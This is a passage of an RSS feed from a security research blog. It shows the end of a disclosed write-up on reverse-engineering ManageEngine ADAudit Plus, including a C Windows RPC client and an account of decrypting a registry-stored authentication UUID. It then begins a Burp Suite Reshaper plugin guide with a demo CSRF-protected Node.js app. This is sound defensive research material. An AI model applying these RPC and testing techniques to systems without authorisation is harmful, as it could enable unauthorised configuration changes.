&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//unsigned char * pszString           = &amp;#34;hello, world&amp;#34;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    unsigned &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; ulCode;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    status = RpcStringBindingCompose(pszUuid,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        pszProtocolSequence,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        pszNetworkAddress,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        pszEndpoint,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        pszOptions,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;amp;pszStringBinding);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (status) exit(status);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    status = RpcBindingFromStringBinding(pszStringBinding, &amp;amp;DefaultIfName_v1_0_c_ifspec);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (status) exit(status);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; arg2_pointer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;* arg_2 = &amp;amp;arg2_pointer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RpcTryExcept
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Proc1(DefaultIfName_v1_0_c_ifspec, arg_0, str1, arg_2);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        RpcExcept(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ulCode = RpcExceptionCode();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Runtime reported exception 0x%lx = %ld\n&amp;#34;&lt;/span&gt;, ulCode, ulCode);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RpcEndExcept
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        status = RpcStringFree(&amp;amp;pszStringBinding);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (status) exit(status);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    status = RpcBindingFree(&amp;amp;DefaultIfName_v1_0_c_ifspec);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (status) exit(status);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/******************************************************/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*         MIDL allocate and free                     */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/******************************************************/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;(malloc(len));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __RPC_USER midl_user_free(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __RPC_FAR* ptr)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    free(ptr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;In this article we managed to reverse engineer the decryption process of
an encrypted value stored in Windows registry. This decrypted value was an UUID
used as a means of authentication when doing configuration changes via the
ADAudit Agent.&lt;/p&gt;
&lt;p&gt;It was a fun and educative process to bit by bit lay the puzzle to
reach the objective and we at Shelltrail hope you enjoyed following along!&lt;/p&gt;
&lt;p&gt;Thanks to ManageEngine (Zoho Corp) for handling the disclosure process.&lt;/p&gt;
&lt;p&gt;In our three part series of security assessing ADAudit Plus we:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/&#34;&gt;Part 1&lt;/a&gt; - Reverse engineered our way to build a RPC client&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/&#34;&gt;Part 2&lt;/a&gt; - Reverse engineered our way to craft valid input to the RPC server&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/&#34;&gt;Part 3&lt;/a&gt; - Reverse engineered our way to decrypt and AES encrypted cipher stored in Windows registry&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Reshaper - The guide to the ultimate Burp plugin for advanced shenanigans</title>
      <link>https://www.shelltrail.com/research/reshaper-the-guide-to-ultimate-burp-plugin-for-advanced-shenanigans/</link>
      <pubDate>Mon, 22 Apr 2024 00:00:00 +0000</pubDate>
      
      <guid>https://www.shelltrail.com/research/reshaper-the-guide-to-ultimate-burp-plugin-for-advanced-shenanigans/</guid>
      <description>

&lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/styles/atom-one-dark.min.css&#34;&gt;


&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;This research will guide you through how to handle complex flows
using the Reshaper plugin when performing web application security testing
with Burp Suite. Even though Burp Suite arguably is the best proxy in the
business - it falls short in certain
tasks where the Reshaper plugin (developed by ddwightx) will shine.&lt;/p&gt;
&lt;p&gt;This research may be used as a reference or baseline when building your Reshaper
rules or a training ground to improve your Burp skills.&lt;/p&gt;
&lt;p&gt;In total 6 scenarios will be displayed where all of them have an accompanied
demo application:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Scenario 1 - Resending CSRF tokens which changes on each request with Burp&lt;/li&gt;
&lt;li&gt;Scenario 2 - Using Burp to increment values with Reshapers Evaluate action&lt;/li&gt;
&lt;li&gt;Scenario 3 - Using Burp with custom scripting via Reshapers JavaScript engine&lt;/li&gt;
&lt;li&gt;Scenario 4 - URL and base64 encoding&lt;/li&gt;
&lt;li&gt;Scenario 5 - Using Burp with command line tools with Reshapers Run Process&lt;/li&gt;
&lt;li&gt;Scenario 6 - Using Burp and Reshaper to perform multiple request and save PDF files to disk&lt;/li&gt;
&lt;li&gt;Scenario 7 - gRPC from the abyss&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;While some of these scenarios can be solved with other solutions such as
Mitmproxy, Hackvertor or Burp macros, this plugin gives more versatility.&lt;/p&gt;
&lt;p&gt;And a big shout out to &lt;a href=&#34;https://github.com/ddwightx&#34;&gt;@ddwightx&lt;/a&gt; for making
all of these stunts available via &lt;a href=&#34;https://github.com/synfron/ReshaperForBurp&#34;&gt;Reshaper&lt;/a&gt;. Big thanks!&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;How many times have you had issues with handling CSRF tokens in a web assessment?
What if you were told that this have been possible all along with the lesser known
plugin called Reshaper?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-plugin-in-bapp-store.png&#34; alt=&#34;reshaper-plugin-in-bapp-store&#34;&gt;&lt;/p&gt;
&lt;p&gt;It is powerful, extremely powerful. The popularity of this plugin is oddly enough low,
maybe because of its complexity and limited guides and detailed setup steps.&lt;/p&gt;
&lt;p&gt;We will show you how to utilize this plugin in some common scenarios where
the standard Burp Suite lacks the capability.&lt;/p&gt;
&lt;h2 id=&#34;reshaper-introduction&#34;&gt;Reshaper introduction&lt;/h2&gt;
&lt;p&gt;When installed Reshaper provides a new tab in burp with multiple sub tabs:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-tabs-in-burp.png&#34; alt=&#34;reshaper-tabs-in-burp&#34;&gt;&lt;/p&gt;
&lt;p&gt;Most time will be spent in the &lt;em&gt;HTTP rules&lt;/em&gt; sub tab as it is here you configure
what actions the plugin should perform.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s start with a simple task such as setting a comment named &lt;em&gt;testing&lt;/em&gt; on HTTP requests.&lt;/p&gt;
&lt;p&gt;Use the add button to create a new rule. In the &lt;em&gt;Whens&lt;/em&gt; frame give it a name and choose the event
direction of the rule. As we want to trigger on outgoing traffic we choose
&lt;code&gt;request&lt;/code&gt; as direction.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-setting-a-comment-on-request.png&#34; alt=&#34;reshaper-setting-a-comment-on-request&#34;&gt;&lt;/p&gt;
&lt;p&gt;The next step is the provide what the action,&lt;em&gt;Thens&lt;/em&gt;, will be when matching the &lt;em&gt;Whens&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;Choose &lt;code&gt;comment&lt;/code&gt; and add. Specify a name, check enabled an finish off with save.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-setting-enabling-comment.png&#34; alt=&#34;reshaper-setting-enabling-comment&#34;&gt;&lt;/p&gt;
&lt;p&gt;We are now done. All request passing through Burp will have the
comment &amp;ldquo;testing&amp;rdquo;. Nice.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-sucessfully-setting-a-comment.png&#34; alt=&#34;reshaper-sucessfully-setting-a-comment&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now we want to change the &lt;em&gt;Whens&lt;/em&gt; to only perform actions when the request is
sent to a specific path i.e &lt;code&gt;/user&lt;/code&gt;. Any of the following &lt;em&gt;matches text&lt;/em&gt; will be sufficient:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Match Text&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Request URI Path&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;/user&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Request URI&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;/user&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Request Status Line&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;GET /user HTTP/1.1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;URL&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;http://localhost:3000/user&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The following setup will successfully comment a request with a status line of
&lt;code&gt;GET /user HTTP/1.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-example-of-matching-text.png&#34; alt=&#34;reshaper-example-of-matching-text&#34;&gt;&lt;/p&gt;
&lt;p&gt;More advanced rules can be performed such as matching if a JSON key value pair exists
in the request body (be mindful that the &lt;em&gt;Source Value Path&lt;/em&gt; and &lt;em&gt;Match Text&lt;/em&gt; should not include quotation):&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-example-of-matching-json-key-value.png&#34; alt=&#34;reshaper-example-of-matching-json-key-value&#34;&gt;&lt;/p&gt;
&lt;p&gt;The following picture is an example request that will be matched by our rule:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-commenting-based-on-json-body.png&#34; alt=&#34;reshaper-commenting-based-on-json-body&#34;&gt;&lt;/p&gt;
&lt;p&gt;Cool. Now we have a basic knowledge how to configure Reshaper. Lets dive in to
some interesting scenarios.&lt;/p&gt;
&lt;h1 id=&#34;scenario-1---resending-csrf-tokens-which-changes-on-each-request-with-burp&#34;&gt;Scenario 1 - Resending CSRF tokens which changes on each request with Burp&lt;/h1&gt;
&lt;p&gt;Alright, we know the basics of how to configure Reshaper. Let&amp;rsquo;s put it to the
test on a demo application.&lt;/p&gt;
&lt;p&gt;The demo application is an API application hosted with node.js. Save this
code as &lt;code&gt;app.js&lt;/code&gt; and run it with &lt;code&gt;node app.js&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// mkdir $HOME/node-api-csrf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// cd $HOME/node-api-csrf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npn init -y
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npm install express uuid
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;v4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;uuidv4&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uuid&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;());  &lt;span style=&#34;color:#75715e&#34;&gt;// Middleware to parse JSON bodies
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// In-memory &amp;#34;database&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// CSRF tokens store
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;csrfTokens&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Map&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Middleware to check CSRF token
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkCsrfToken&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;csrfToken&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;headers&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;csrf-token&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;csrfToken&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;csrfTokens&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;has&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;csrfToken&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newToken&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;uuidv4&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;csrfTokens&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;newToken&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CSRF-Token&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;newToken&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// Provide a valid CSRF token in response header
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid CSRF token&amp;#34;&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// CSRF token is valid, let&amp;#39;s remove it and proceed
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;csrfTokens&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;delete&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;csrfToken&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Route to add a user
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;post&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/user&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;checkCsrfToken&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;;
